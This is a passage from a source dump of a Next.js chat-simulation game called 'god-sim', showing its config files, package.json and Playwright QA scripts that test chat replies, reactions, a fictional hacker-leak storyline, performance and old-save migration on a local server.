  },
  {
    // Test fixtures are raw provider JSON.
    files: ["tests/**"],
    rules: { "@typescript-eslint/no-explicit-any": "off" },
  },
  // Override default ignores of eslint-config-next.
  globalIgnores([
    // Default ignores of eslint-config-next:
    ".next/**",
    
    
    
    "out/**",
    "build/**",
    "next-env.d.ts",
  ]),
]);

export default eslintConfig;

```

## next-env.d.ts
```ts
/// <reference types="next" />
/// <reference types="next/image-types/global" />
import "./.next/types/routes.d.ts";
import "./.next/types/root-params.d.ts";

// NOTE: This file should not be edited
// see https://nextjs.org/docs/app/api-reference/config/typescript for more information.

```

## next.config.ts
```ts
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  poweredByHeader: false,
  turbopack: {
    rules: {
      "*.css": {
        loaders: ["@tailwindcss/turbopack"],
        as: "*.css",
      },
    },
  },
};

export default nextConfig;

```

## package.json
```json
{
  "name": "god-sim",
  "version": "0.1.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start -p 3100",
    "lint": "eslint",
    "test": "vitest run",
    "typecheck": "tsc --noEmit",
    "screenshots": "node scripts/screenshots.mjs"
  },
  "dependencies": {
    "ai": "^7.0.162",
    "clsx": "^2.1.1",
    "lucide-react": "^1.67.0",
    "next": "16.4.5",
    "react": "19.3.0",
    "react-dom": "19.3.0"
  },
  "devDependencies": {
    "@tailwindcss/turbopack": "^4",
    "@types/node": "^24.19.2",
    "@types/react": "^19",
    "@types/react-dom": "^19",
    "eslint": "^9",
    "eslint-config-next": "16.4.5",
    "fake-indexeddb": "^6.2.7",
    "playwright-core": "^1.64.1",
    "tailwindcss": "^4",
    "typescript": "^5",
    "vitest": "^5.1.0"
  }
}

```

## qa/acceptance.mjs
```mjs
// Acceptance: @god speaks in GOD HQ #general on a phone viewport and the world reacts.
import { chromium } from "playwright-core";
import fs from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:3100";
const PREFIX = process.env.PREFIX ?? "local";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
const VID = `${OUT}video-tmp/`;
fs.mkdirSync(VID, { recursive: true });
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true, recordVideo: { dir: VID, size: { width: 390, height: 844 } } });
const page = await ctx.newPage();
const errors = [];
page.on("pageerror", (e) => errors.push(e.message));
page.on("console", (m) => { if (m.type() === "error") errors.push(`console: ${m.text()}`); });

await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
const box = page.getByPlaceholder("Message #general");
await box.waitFor({ timeout: 60000 });
const catchUp = page.getByRole("button", { name: "Catch up" });
if (await catchUp.isVisible().catch(() => false)) { await catchUp.click(); await wait(500); }
await page.evaluate(() => { location.hash = "#/lounge/godhq/godhq-general"; });
await wait(1500);

const snap = () => page.evaluate(() => {
  const rows = [...document.querySelectorAll("[data-mid]")];
  const sec = document.querySelector("section")?.innerText ?? document.body.innerText;
  const godRows = rows.filter((r) => r.dataset.author === "god");
  const g = godRows[godRows.length - 1];
  const rx = g ? [...g.querySelectorAll("button[aria-pressed]")].reduce((a, b) => a + (parseInt(b.innerText.replace(/\D+/g, " ").trim().split(" ").pop()) || 0), 0) : 0;
  const badge = (id) => parseInt(document.querySelector(`[data-badge="${id}"]`)?.textContent ?? "0") || 0;
  return {
    mids: rows.map((r) => r.dataset.mid),
    authors: Object.fromEntries(rows.map((r) => [r.dataset.mid, [r.dataset.author, r.dataset.replyAuthor ?? ""]])),
    typing: /typing…/.test(document.body.innerText) ? (document.body.innerText.match(/[^\n]*typing…/) ?? [""])[0] : "",
    godRx: rx, more: badge("more"), lounge: badge("lounge"), hasText: sec.includes("sup guys"),
  };
});
const before = await snap();
const seen = new Set(before.mids);
const badgeBefore = before.more + before.lounge;

await box.fill("sup guys");
await box.press("Enter");
const t0 = Date.now();
const first = {};
const mark = (k) => { if (first[k] == null) first[k] = Date.now() - t0; };
let last, shots = 0;
while (Date.now() - t0 < 15000) {
  last = await snap();
  if (last.typing) mark("typing");
  const fresh = last.mids.filter((id) => !seen.has(id)).map((id) => last.authors[id]);
  if (fresh.some(([a]) => a?.startsWith("c"))) mark("firstCharacterMessage");
  if (fresh.some(([a, ra]) => a?.startsWith("c") && ra === "god")) mark("replyToGod");
  if (fresh.some(([a, ra]) => a?.startsWith("c") && ra.startsWith("c"))) mark("characterToCharacter");
  if (last.godRx > 0) mark("reactionsOnGod");
  if (last.more + last.lounge > badgeBefore) mark("notificationBadge");
  const el = Date.now() - t0;
  if (shots === 0 && (last.typing || el > 2200)) { await page.screenshot({ path: `${OUT}${PREFIX}-godspeaks-1.png` }); shots = 1; }
  if (shots === 1 && el > 3200) { await page.screenshot({ path: `${OUT}${PREFIX}-godspeaks-2.png` }); shots = 2; }
  await wait(200);
}
await page.screenshot({ path: `${OUT}${PREFIX}-godspeaks-3.png` });
const freshCount = last.mids.filter((id) => !seen.has(id)).length;

// other servers echo it later (shared event bus) — find their messages through global search
let echoes = [], tEcho = null;
while (Date.now() - t0 < 300000) {
  await wait(10000);
  await page.evaluate(() => { location.hash = "#/search?q=sup%20guys"; });
  await wait(1200);
  echoes = await page.$$eval("[data-testid=search-msg]", (b) => b.map((x) => x.innerText.replace(/\s+/g, " ")).filter((t) => !t.includes("GOD HQ #")));
  if (echoes.length) { tEcho = Date.now() - t0; break; }
}
await page.screenshot({ path: `${OUT}${PREFIX}-godspeaks-4.png` });
const video = page.video();
await ctx.close();
const vp = await video.path();
fs.renameSync(vp, `${OUT}${PREFIX}-godspeaks.webm`);
fs.rmSync(VID, { recursive: true, force: true });
await browser.close();

const report = { base: BASE, firstSeenMs: first, newMessagesIn15s: freshCount, godReactionsAt15s: last.godRx, badge: { before: badgeBefore, after: last.more + last.lounge }, echoAfterMs: tEcho, echoes: echoes.slice(0, 5), errors };
console.log(JSON.stringify(report, null, 2));
const ok = first.typing <= 3000 && first.replyToGod <= 4000 && first.characterToCharacter != null && first.reactionsOnGod != null && first.notificationBadge != null && echoes.length > 0 && !errors.length;
console.log(ok ? "ACCEPTANCE PASS" : "ACCEPTANCE FAIL");

```

## qa/ai.mjs
```mjs
// Quick live check: DM memory (3 turns), "sup guys" in #general, and The Undernet in the server rail.
import { chromium } from "playwright-core";
import fs from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:3100";
const P = process.env.PREFIX ?? "local";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true });
const page = await ctx.newPage();
const errors = [], api = [];
page.on("pageerror", (e) => errors.push(e.message));
page.on("response", async (r) => { if (r.url().includes("/api/chat")) { const j = await r.json().catch(() => ({})); api.push({ status: r.status(), model: j.model, code: j.code, remember: j.remember }); } });
const R = { base: BASE };
const rows = () => page.evaluate(() => [...document.querySelectorAll("[data-mid]")].map((r) => ({ id: r.dataset.mid, a: r.dataset.author, text: r.innerText.slice(0, 240).replace(/\n/g, " | ") })));
const hash = async (h) => { await page.evaluate((x) => { location.hash = x; }, h); await wait(1300); };
await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
await page.getByPlaceholder("Message #general").waitFor({ timeout: 90000 });
const cu = page.getByRole("button", { name: "Catch up" });
if (await cu.isVisible().catch(() => false)) { await cu.click(); await wait(500); }
await hash("#/lounge/godhq/godhq-general");
// rail
await page.getByRole("button", { name: "Open channels" }).first().click(); await wait(700);
const ub = page.locator('nav button[title="The Undernet"]');
R.undernetInRail = (await ub.count()) > 0;
if (R.undernetInRail) { await ub.evaluate((e) => e.scrollIntoView({ block: "center" })); await wait(300); }
await page.screenshot({ path: `${OUT}${P}-undernet-rail.png` });
await page.keyboard.press("Escape"); await hash("#/lounge/godhq/godhq-general");
await page.mouse.click(380, 400).catch(() => {}); await wait(400);
// sup guys
const box = page.getByPlaceholder("Message #general");
let before = new Set((await rows()).map((r) => r.id));
await box.fill("sup guys"); await box.press("Enter");
await wait(14000);
R.supReplies = (await rows()).filter((r) => !before.has(r.id) && r.a !== "god").map((r) => r.text).slice(0, 8);
await page.screenshot({ path: `${OUT}${P}-ai-general.png` });
// DM memory
const active = (await rows()).reverse().find((r) => r.a && r.a.startsWith("c"));
const peer = active.a;
await hash(`#/lounge/dm/dm:${["god", peer].sort().join(":")}`);
const dbox = page.locator("textarea[placeholder^='Message @'], input[placeholder^='Message @']").first();
R.convo = [];
for (const [i, said] of ["my dog is called Biscuit btw", "should i get him a second dog or is that too much?", "wait what's my dog's name again"].entries()) {
  before = new Set((await rows()).map((r) => r.id));
  await dbox.fill(said); await dbox.press("Enter");
  let got = [];
  for (let k = 0; k < 14; k++) { await wait(1000); got = (await rows()).filter((r) => !before.has(r.id) && r.a === peer); if (got.length && k > 4) break; }
  R.convo.push({ god: said, replies: got.map((r) => r.text) });
  await page.screenshot({ path: `${OUT}${P}-ai-dm-${i + 1}.png` });
  await wait(1500);
}
R.api = api; R.errors = errors;
fs.writeFileSync(`${OUT}${P}-ai-report.json`, JSON.stringify(R, null, 2));
console.log(JSON.stringify(R, null, 2));
await browser.close();

```

## qa/interact.mjs
```mjs
// Phone acceptance for the interactivity pass + gh0st storyline: typing presence, reaction cascade,
// voice lounge, @mention + soft command, and a leak that spreads across Lounge, Chirp, news and events.
import { chromium } from "playwright-core";
import fs from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:3100";
const P = process.env.PREFIX ?? "local";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
fs.mkdirSync(OUT, { recursive: true });
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true });
const page = await ctx.newPage();
const errors = [];
page.on("pageerror", (e) => errors.push(e.message));
page.on("console", (m) => { if (m.type() === "error" && !/api\/chat|Failed to load resource/.test(m.text())) errors.push(`console: ${m.text()}`); });
const R = { base: BASE };
const shot = (n) => page.screenshot({ path: `${OUT}${P}-${n}.png` });
const hash = async (h) => { await page.evaluate((x) => { location.hash = x; }, h); await wait(1300); };
const rows = () => page.evaluate(() => [...document.querySelectorAll("[data-mid]")].map((r) => ({ id: r.dataset.mid, a: r.dataset.author, ra: r.dataset.replyAuthor, meme: !!r.querySelector("[data-meme]"), text: r.innerText.slice(0, 240).replace(/\n/g, " | ") })));
const worldJson = () => page.evaluate(() => new Promise((res) => {
  const r = indexedDB.open("god-sim", 1);
  r.onsuccess = () => {
    const st = r.result.transaction("kv", "readonly").objectStore("kv");
    const k = st.getAllKeys();
    k.onsuccess = () => { const key = k.result.find((x) => String(x).includes("world")); if (!key) return res(null); const g = st.get(key); g.onsuccess = () => res(g.result ?? null); };
  };
  r.onerror = () => res(null);
}));
const t0 = Date.now(), ms = () => Date.now() - t0;

await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
await page.getByPlaceholder("Message #general").waitFor({ timeout: 60000 });
const cu = page.getByRole("button", { name: "Catch up" });
if (await cu.isVisible().catch(() => false)) { await cu.click(); await wait(500); }
await hash("#/lounge/godhq/godhq-general");
const box = page.getByPlaceholder("Message #general");

// 1. typing without sending
let before = new Set((await rows()).map((r) => r.id));
await box.click(); await box.type("hmm", { delay: 60 });
const typedAt = ms();
let typingSeen = null;
for (let i = 0; i < 20 && !typingSeen; i++) { await wait(250); typingSeen = await page.getByText(/is typing…|are typing…/).first().textContent().catch(() => null); }
R.typing = { indicator: typingSeen, afterMs: ms() - typedAt };
await shot("typing-1");
await wait(3500);
const tReacts = (await rows()).filter((r) => !before.has(r.id) && r.a !== "god");
R.typing.reactions = tReacts.map((r) => r.text).slice(0, 6);
await shot("typing-2");
await box.fill(""); await wait(400);

// 2. react to a character message
const target = (await rows()).reverse().find((r) => r.a && r.a.startsWith("c") && !r.meme);
before = new Set((await rows()).map((r) => r.id));
const el = page.locator(`[data-mid="${target.id}"]`);
await el.scrollIntoViewIfNeeded(); await el.click(); await wait(300);
await page.getByRole("button", { name: "React 🔥" }).first().click();
const reactedAt = ms();
let authorReply;
for (let i = 0; i < 24 && !authorReply; i++) { await wait(250); authorReply = (await rows()).find((r) => !before.has(r.id) && r.a === target.a); }
R.react = { target: target.text, authorReplyMs: authorReply ? ms() - reactedAt : null, authorReply: authorReply?.text };
await wait(4000);
R.react.pileOn = (await rows()).filter((r) => !before.has(r.id) && r.a !== target.a && r.a !== "god").map((r) => r.text).slice(0, 5);
R.react.chip = await page.locator(`[data-mid="${target.id}"] button[aria-label^="🔥"]`).first().getAttribute("aria-label").catch(() => null);
await shot("react-1");
await page.evaluate((id) => document.querySelector(`[data-mid="${id}"]`)?.scrollIntoView({ block: "center" }), target.id); await wait(300);
await shot("react-2");

// 3. join voice
await page.getByRole("button", { name: "Open channels" }).first().click(); await wait(600);
await page.getByTestId("voice-list").scrollIntoViewIfNeeded();
await shot("voice-1");
await page.getByRole("button", { name: "Join voice" }).first().click(); await wait(1200);
await shot("voice-2");
const closeBtn = page.getByRole("button", { name: "Close" }).first();
if (await closeBtn.isVisible().catch(() => false)) await closeBtn.click();
await hash("#/lounge/godhq/godhq-general");
await wait(4500);
R.voice = {
  bar: await page.getByTestId("voice-bar").innerText().catch(() => null),
  banner: await page.getByTestId("voice-banner").last().innerText().catch(() => null),
  hype: (await rows()).slice(-5).map((r) => r.text),
};
await shot("voice-3");
await wait(9000);
R.voice.barLater = await page.getByTestId("voice-bar").innerText().catch(() => null);
await shot("voice-4");

// 4. mention + soft commands
const w = await worldJson();
const srv = w.servers.find((x) => x.id === "godhq");
const talker = [...w.messages].reverse().find((m) => m.channelId === "godhq-general" && m.authorId.startsWith("c") && srv.members.includes(m.authorId));
const ch = w.characters.find((c) => c.id === talker.authorId);
R.command = [];
for (const [i, text] of [`@${ch.username} tell a joke`, `@${ch.username} drop a meme`].entries()) {
  before = new Set((await rows()).map((r) => r.id));
  await box.fill(text); await box.press("Enter");
  const sent = ms();
  let rep;
  for (let k = 0; k < 40 && !rep; k++) { await wait(200); rep = (await rows()).find((r) => !before.has(r.id) && r.a === ch.id); }
  await wait(rep?.meme || i === 0 ? 1200 : 3000);
  const again = (await rows()).filter((r) => !before.has(r.id) && r.a === ch.id);
  R.command.push({ said: text, replyMs: rep ? ms() - sent : null, reply: again.map((r) => r.text), meme: again.some((r) => r.meme) });
  await shot(`command-${i + 1}`);
}

// 5. hacker storyline: dare gh0st in DMs, then watch the leak spread
const g = w.characters.find((c) => c.username === "gh0st_");
const dm = `dm:${["god", g.id].sort().join(":")}`;
await hash(`#/lounge/dm/${dm}`);
const dbox = page.getByPlaceholder(/^Message @/);
before = new Set((await rows()).map((r) => r.id));
await dbox.fill("go on then. leak it"); await dbox.press("Enter");
const dared = ms();
let ghReply;
for (let k = 0; k < 40 && !ghReply; k++) { await wait(250); ghReply = (await rows()).find((r) => !before.has(r.id) && r.a === g.id); }
R.hacker = { dmReplyMs: ghReply ? ms() - dared : null, dmReply: ghReply?.text };
await wait(1500);
await shot("hacker-dm");
let leak;
before = new Set();
await hash("#/lounge/undernet/undernet-leaks");
let dropRow;
for (let k = 0; k < 75 && !dropRow; k++) { await wait(2000); dropRow = (await rows()).find((r) => !before.has(r.id) && r.a === g.id && r.meme); }
R.hacker.leakAfterMs = dropRow ? ms() - dared : null;
R.hacker.drop = dropRow?.text;
leak = dropRow && ((await worldJson())?.topics ?? []).filter((t) => t.category === "leak").sort((a, b) => b.startedAt - a.startedAt)[0];
R.hacker.tag = leak?.tag;
if (leak) {
  await page.evaluate((id) => document.querySelector(`[data-mid="${id}"]`)?.scrollIntoView({ block: "center" }), dropRow.id); await wait(800);
  await shot("hacker-drop");
  await wait(25000);
  await hash("#/lounge/undernet/undernet-leaks"); await wait(800);
  R.hacker.undernet = (await rows()).slice(-4).map((r) => r.text);
  const doc = (await rows()).reverse().find((r) => r.meme);
  if (doc) await page.evaluate((id) => document.querySelector(`[data-mid="${id}"]`)?.scrollIntoView({ block: "center" }), doc.id); await wait(600);
  await shot("hacker-undernet");
  await hash("#/chirp"); await wait(800);
  const post = page.getByText(`#${leak.tag}`).first();
  R.hacker.chirp = await post.count() > 0;
  if (R.hacker.chirp) await post.evaluate((e) => e.scrollIntoView({ block: "center" })); await wait(600);
  await shot("hacker-chirp");
  await hash("#/events"); await wait(800);
  R.hacker.choices = await page.getByRole("button", { name: /pay|deny|counter|white hat|hire/i }).allTextContents().catch(() => []);
  await shot("hacker-event");
  await wait(Math.max(0, 200000 - (ms() - dared)));
  await hash("#/news"); await wait(800);
  R.hacker.news = await page.getByText(/GODWATCH/i).first().count() > 0;
  await shot("hacker-news");
  await hash("#/lounge/godhq/godhq-general"); await wait(800);
  const wl = await worldJson();
  R.hacker.loungeReactions = wl.messages.filter((m) => m.topicId === leak.id && m.serverId !== "undernet" && m.serverId !== "dm").slice(0, 4).map((m) => m.text);
  await shot("hacker-lounge");
}
R.errors = errors;
fs.writeFileSync(`${OUT}${P}-interact-report.json`, JSON.stringify(R, null, 2));
console.log(JSON.stringify(R, null, 2));
await browser.close();

```

## qa/live.mjs
```mjs
// Live checks for pt20u: a 3-message DM conversation, memes in Lounge and Chirp, background-tab continuity.
import { chromium } from "playwright-core";
import fs from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:3100";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
fs.mkdirSync(OUT, { recursive: true });
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true });
const page = await ctx.newPage();
const errors = [], calls = [];
page.on("pageerror", (e) => errors.push(e.message));
page.on("console", (m) => { if (m.type() === "error" && !/api\/chat|Failed to load resource/.test(m.text())) errors.push(`console: ${m.text()}`); });
page.on("response", async (r) => {
  if (!r.url().includes("/api/chat")) return;
  let body = {}; try { body = JSON.parse(r.request().postData() ?? "{}"); } catch {}
  let res = {}; try { res = await r.json(); } catch {}
  calls.push({ status: r.status(), god: body.god, history: (body.history ?? []).length, histText: (body.history ?? []).map((h) => `${h.who}: ${h.text}`), res: { lines: res.lines, code: res.code, model: res.model, usage: res.usage, detail: res.detail } });
});
const report = { base: BASE };

await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
await page.getByPlaceholder("Message #general").waitFor({ timeout: 60000 });
const catchUp = page.getByRole("button", { name: "Catch up" });
if (await catchUp.isVisible().catch(() => false)) { await catchUp.click(); await wait(500); }
await page.evaluate(() => { location.hash = "#/lounge/godhq/godhq-general"; });
await wait(1500);
const rows = () => page.evaluate(() => [...document.querySelectorAll("[data-mid]")].map((r) => ({ id: r.dataset.mid, a: r.dataset.author, meme: !!r.querySelector("[data-meme]"), text: r.innerText.slice(0, 200) })));

// ---- memes: say something and watch
const box = page.getByPlaceholder("Message #general");
await box.fill("i just made it rain cereal over port lumen"); await box.press("Enter");
let memeRow;
for (let i = 0; i < 40 && !memeRow; i++) { await wait(1500); memeRow = (await rows()).find((r) => r.meme); }
report.loungeMeme = memeRow ? memeRow.text.replace(/\n/g, " | ") : null;
if (memeRow) {
  const el = page.locator(`[data-mid="${memeRow.id}"]`);
  await el.scrollIntoViewIfNeeded(); await wait(400);
  await page.screenshot({ path: `${OUT}live-meme-lounge.png` });
  await el.screenshot({ path: `${OUT}live-meme-row.png` });
  await el.locator("[data-meme]").first().click(); await wait(500);
  await page.screenshot({ path: `${OUT}live-meme-lightbox.png` });
  await page.keyboard.press("Escape"); await wait(300);
  report.lightboxClosed = !(await page.locator('[role="dialog"][aria-label="Image"]').count());
}
await page.evaluate(() => { location.hash = "#/chirp"; }); await wait(2000);
const chirpMeme = page.locator("[data-meme]").first();
report.chirpMeme = await chirpMeme.count() > 0;
if (report.chirpMeme) { await chirpMeme.scrollIntoViewIfNeeded(); await wait(400); await page.screenshot({ path: `${OUT}live-meme-chirp.png` }); }

// ---- DM conversation with someone who was just active
await page.evaluate(() => { location.hash = "#/lounge/godhq/godhq-general"; }); await wait(1200);
const active = (await rows()).reverse().find((r) => r.a && r.a !== "god" && r.a.startsWith("c"));
const peer = active.a;
const dm = `dm:${["god", peer].sort().join(":")}`;
await page.evaluate((h) => { location.hash = h; }, `#/lounge/dm/${dm}`); await wait(1500);
const dbox = page.locator("textarea, input").filter({ has: page.locator("xpath=self::*[starts-with(@placeholder,'Message @')]") }).first();
const lines = ["hey, quick one. my dog is called Biscuit and he just ate my sandwich", "what should i do with him lol", "wait what was my dog's name again? and what did he eat"];
report.convo = [];
for (let i = 0; i < lines.length; i++) {
  const before = new Set((await rows()).map((r) => r.id));
  await dbox.fill(lines[i]); await dbox.press("Enter");
  let got = [];
  for (let k = 0; k < 60; k++) {
    await wait(1500);
    got = (await rows()).filter((r) => !before.has(r.id) && r.a === peer);
    if (got.length && k > 6) break;
  }
  report.convo.push({ god: lines[i], replies: got.map((r) => r.text.replace(/\n/g, " | ")) });
  await page.screenshot({ path: `${OUT}live-convo-${i + 1}.png` });
}

// ---- background tab: hide, wait, come back
await page.evaluate(() => { location.hash = "#/lounge/godhq/godhq-general"; }); await wait(1200);
const countWorld = () => page.evaluate(() => JSON.parse(localStorage.getItem(Object.keys(localStorage).find((k) => k.startsWith("god-sim:world")) ?? "") ?? "null")?.messages?.length ?? -1);
const shown0 = (await rows()).length;
await page.evaluate(() => { Object.defineProperty(document, "visibilityState", { configurable: true, get: () => "hidden" }); Object.defineProperty(document, "hidden", { configurable: true, get: () => true }); document.dispatchEvent(new Event("visibilitychange")); });
const ids0 = new Set((await rows()).map((r) => r.id));
await wait(45000);
const idsHidden = (await rows()).filter((r) => !ids0.has(r.id)).length;
await page.evaluate(() => { Object.defineProperty(document, "visibilityState", { configurable: true, get: () => "visible" }); Object.defineProperty(document, "hidden", { configurable: true, get: () => false }); document.dispatchEvent(new Event("visibilitychange")); });
await wait(800);
const idsBack = (await rows()).filter((r) => !ids0.has(r.id)).length;
report.background = { shownBefore: shown0, newWhileHiddenRendered: idsHidden, newRightAfterReturn: idsBack };
await page.screenshot({ path: `${OUT}live-background-return.png` });
void countWorld;

report.apiCalls = calls;
report.errors = errors;
fs.writeFileSync(`${OUT}live-report.json`, JSON.stringify(report, null, 2));
console.log(JSON.stringify(report, null, 2));
await browser.close();

```

## qa/perf.mjs
```mjs
// Perf probe: catch-up duration + main-thread busy time per second while idle on each screen.
import { chromium } from "playwright-core";
const BASE = process.env.BASE ?? "http://localhost:3100";
const THROTTLE = Number(process.env.THROTTLE ?? 4);
const b = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const out = {};
async function fresh(away) {
  const ctx = await b.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2 });
  const p = await ctx.newPage();
  const cdp = await ctx.newCDPSession(p);
  await cdp.send("Emulation.setCPUThrottlingRate", { rate: THROTTLE });
  await p.addInitScript(() => {
    window.__lt = []; new PerformanceObserver((l) => { for (const e of l.getEntries()) window.__lt.push(e.duration); }).observe({ type: "longtask", buffered: true });
  });
  const t0 = Date.now();
  await p.goto(`${BASE}/?demo${away ? `&away=${away}` : ""}#/lounge`);
  await p.locator("main").waitFor({ timeout: 120000 });
  const ready = Date.now() - t0;
  const lt = await p.evaluate(() => window.__lt);
  return { ctx, p, cdp, ready, maxLong: Math.round(Math.max(0, ...lt)), longOver200: lt.filter((x) => x > 200).length };
}
for (const away of ["", "10m", "6h", "3d"]) {
  const r = await fresh(away);
  out[`load${away ? "+away=" + away : ""}`] = { readyMs: r.ready, maxLongTaskMs: r.maxLong, longTasksOver200ms: r.longOver200 };
  if (away === "6h") {
    const { p, cdp } = r;
    const close = p.getByRole("button", { name: "Catch up" }); if (await close.count()) await close.click();
    await cdp.send("Performance.enable");
    for (const route of ["#/lounge", "#/chirp", "#/news", "#/dashboard", "#/platforms/snapgram"]) {
      await p.evaluate((h) => { location.hash = h; }, route); await p.waitForTimeout(1500);
      await p.evaluate(() => { window.__lt = []; });
      const m0 = Object.fromEntries((await cdp.send("Performance.getMetrics")).metrics.map((m) => [m.name, m.value]));
      await p.waitForTimeout(8000);
      const m1 = Object.fromEntries((await cdp.send("Performance.getMetrics")).metrics.map((m) => [m.name, m.value]));
      const lt = await p.evaluate(() => window.__lt);
      out[`idle ${route}`] = { busyMsPerSec: Math.round(((m1.TaskDuration - m0.TaskDuration) * 1000) / 8), scriptMsPerSec: Math.round(((m1.ScriptDuration - m0.ScriptDuration) * 1000) / 8), longTasks: lt.length, maxLongMs: Math.round(Math.max(0, ...lt)), heapMB: Math.round(m1.JSHeapUsedSize / 1e6) };
    }
  }
  await r.ctx.close();
}
await b.close();
console.log(JSON.stringify(out, null, 1));

```

## qa/rail.mjs
```mjs
// Old-save check: strip The Undernet from a saved world (pretend it is an early v5 save), reload,
// and confirm the server shows up in the rail plus the one-time tip.
import { chromium } from "playwright-core";
import fs from "node:fs";
const BASE = process.env.BASE ?? "http://localhost:3100";
const P = process.env.PREFIX ?? "local";
const OUT = new URL("../screenshots/", import.meta.url).pathname;
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true });
const page = await ctx.newPage();
const errors = [];
page.on("pageerror", (e) => errors.push(e.message));
const R = { base: BASE };
const ready = async () => {
  await page.getByPlaceholder(/^Message #/).first().waitFor({ timeout: 90000 });
  const cu = page.getByRole("button", { name: "Catch up" });
  if (await cu.isVisible().catch(() => false)) { await cu.click(); await wait(500); }
};
await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
await ready(); await wait(3000);
// leave the app, then rewrite the save from a same-origin non-app page
await page.route("**/__blank", (r) => r.fulfill({ contentType: "text/html", body: "<html><body>blank</body></html>" }));
await page.goto(`${BASE}/__blank`); await wait(500);
R.stripped = await page.evaluate(() => new Promise((res) => {
  const r = indexedDB.open("god-sim", 1);
  r.onerror = () => res({ err: String(r.error) });
  r.onblocked = () => res({ err: "blocked" });
  r.onsuccess = () => {
    const st = r.result.transaction("kv", "readwrite").objectStore("kv");
    const k = st.getAllKeys();
    k.onsuccess = () => {
      const key = k.result.find((x) => String(x).includes("world"));
      const g = st.get(key);
      g.onsuccess = () => {
        const w = g.result;
        const had = w.servers.some((x) => x.id === "undernet");
        w.servers = w.servers.filter((x) => x.id !== "undernet");
        for (const c of w.characters) c.servers = c.servers.filter((x) => x !== "undernet");
        delete w.undernet; w.version = 5;
        const p = st.put(w, key); p.onsuccess = () => res({ key, had, servers: w.servers.length });
      };
    };
  };
}));
await page.goto(`${BASE}/?demo#/lounge/godhq/godhq-general`, { waitUntil: "networkidle" });
await ready();
let tip = null;
for (let i = 0; i < 20 && !tip; i++) { await wait(250); tip = await page.getByText(/New: The Undernet/).first().textContent().catch(() => null); }
R.tip = tip;
await page.screenshot({ path: `${OUT}${P}-undernet-tip.png` });
await page.getByRole("button", { name: "Open channels" }).first().click(); await wait(700);
const btn = page.locator('nav button[title="The Undernet"]');
R.railButtons = await page.locator("nav button[title]").evaluateAll((b) => b.map((x) => x.title));
await btn.evaluate((e) => e.scrollIntoView({ block: "center" })); await wait(400);
R.undernetInRail = await btn.isVisible();
await page.screenshot({ path: `${OUT}${P}-undernet-rail.png` });
await btn.click(); await wait(900);
await page.screenshot({ path: `${OUT}${P}-undernet-channels.png` });
R.channels = await page.locator("nav").innerText().then((t) => t.split("\n").filter((l) => /lobby|leaks|rumors|ransom|trophy|Undernet/.test(l)));
R.errors = errors;
fs.writeFileSync(`${OUT}${P}-undernet-rail.json`, JSON.stringify(R, null, 2));
console.log(JSON.stringify(R, null, 2));
await browser.close();
console.log(R.undernetInRail && R.tip && !errors.length ? "RAIL PASS" : "RAIL FAIL");

```

## qa/smoke.mjs
```mjs
// Clicks through every interactive surface on phone + desktop; fails on page errors, horizontal overflow or dead controls.
import { chromium } from "playwright-core";
const BASE = process.env.BASE ?? "http://localhost:3100";
const OUT = new URL("../screenshots/qa-", import.meta.url).pathname;
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const b = await chromium.launch({ executablePath: "/usr/bin/google-chrome", args: ["--no-sandbox"] });
const problems = [];
for (const [label, vp] of [["mobile", { width: 390, height: 844 }], ["desktop", { width: 1440, height: 900 }]]) {
  const ctx = await b.newContext({ viewport: vp, hasTouch: label === "mobile" });
  const page = await ctx.newPage(); page.setDefaultTimeout(8000);
  page.on("pageerror", (e) => problems.push(`${label} error: ${e.message}`));
  page.on("console", (m) => { if (m.type() === "error") problems.push(`${label} console: ${m.text()}`); });
  const step = async (name, fn) => {
    try { await fn(); } catch (e) { problems.push(`${label} ${name}: ${e.message.split("\n")[0]}`); }
